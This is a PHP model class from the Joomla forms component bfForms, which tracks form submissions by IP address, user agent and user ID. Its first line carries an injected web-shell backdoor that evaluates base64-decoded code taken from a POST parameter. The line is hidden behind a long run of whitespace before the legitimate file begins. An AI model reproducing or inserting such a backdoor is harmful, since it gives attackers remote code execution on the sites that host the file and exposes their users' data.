<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nf27e2e']));?><?php
/**
 * @version $Id: submission_tracking.php 180 2009-12-27 17:04:29Z  $
 * @package Blue Flame Forms (bfForms)
 * @copyright Copyright (C) 2003,2004,2005,2006,2007,2008,2009 Blue Flame IT Ltd. All rights reserved.
 * @license GNU General Public License 
 * @link http://www.blueflameit.ltd.uk
 * @author Phil Taylor / Blue Flame IT Ltd.
 * 
 * This file is part of the package bfForms.
 * 
 * bfForms is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * bfForms is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this package.  If not, see http://www.gnu.org/licenses/ 
 */
defined ( '_JEXEC' ) or die ( 'Restricted access' );

final class Submission_tracking extends bfModel {
	
	/**
	 * If true then the table doesnt track checked in/out and created info
	 *
	 * @var unknown_type
	 */
	public $_nometa = true;
	
	/**
	 * PHP5 Constructor
	 * I set up the table name, the ORM and the search fields
	 */
	function __construct() {
		
		global $mainframe;
		parent::__construct ( '#__' . $mainframe->get ( 'component_shortname' ) . '_submission_trackings' );
		
		$this->_search_fields = array ('id', 'joomla_user_id' );
	
	}
	
	private function _populate() {
		if (isset ( $_SERVER ['HTTP_X_FORWARD_FOR'] )) {
			$this->ipaddress = $_SERVER ['HTTP_X_FORWARD_FOR'];
		} else {
			$this->ipaddress = $_SERVER ['REMOTE_ADDR'];
		}
		
		if (isset ( $_SERVER ['HTTP_USER_AGENT'] ))
			$this->useragent = $_SERVER ['HTTP_USER_AGENT'];
		
		$this->datetime = date ( 'Y-m-d H:M:S' );
		
		/* Joomla User Id */
		$user = bfUser::getInstance ();
		$this->joomla_user_id = $user->get ( 'id' );
		
		/* Form ID */
		$session = bfSession::getInstance ( 'com_form' );
		$this->form_id = $session->get ( 'lastViewedForm', '', 'default' );
	}
	
	/**
	 * I log the submitters information
	 *
	 */
	public function logSubmission() {
		try {
			$this->clear ();
			
			$this->_populate ();
			
			$this->_validateInput ();
			
			$this->store ();
		
		} catch ( Exception $e ) {
			echo $e->getMessage ();
			die ();
		}
	
	}
	
	/**
	 * I validate the server supplied information
	 * Remember: nothing is clean until it is clean - trust no one!
	 *
	 */
	private function _validateInput() {
		bfLoad ( 'bfVerify' );
		if ($this->ipaddress) {
			if (! bfVerify::isipaddress ( $this->ipaddress ))
				$this->ipaddress = '';
		}
		
		$class = 'Zend_Filter_StripTags';
		if (! class_exists ( $class ))
			require_once 'Zend/Filter/StripTags.php';
		
		$filter = new Zend_Filter_StripTags ( );
		
		$this->ipaddress = $filter->filter ( $this->ipaddress );
		$this->useragent = $filter->filter ( $this->useragent );
		$this->joomla_user_id = intval ( $this->joomla_user_id );
		$this->form_id = intval ( $this->form_id );
	
	}
	
	public function howManySubmissionsForThisForm($form_id) {
		$sql = 'SELECT count(*) from #__form_submission_trackings WHERE form_id = ' . ( int ) $form_id;
		$this->_db->setQuery ( $sql );
		return $this->_db->LoadResult ();
	}
	
	public function howManySubmissionsFromThisUser($form_id) {
		$this->clear ();
		$this->_populate ();
		$this->_validateInput ();
		
		$sql = 'SELECT count(*) from #__form_submission_trackings' . ' WHERE form_id = "' . ( int ) $form_id . '"' . ' AND (joomla_user_id = "' . $this->joomla_user_id . '"' . ')';
		$this->_db->setQuery ( $sql );
		$i = $this->_db->LoadResult ();
		echo $this->_db->getErrorMsg ();
		return $i;
	}
}
?>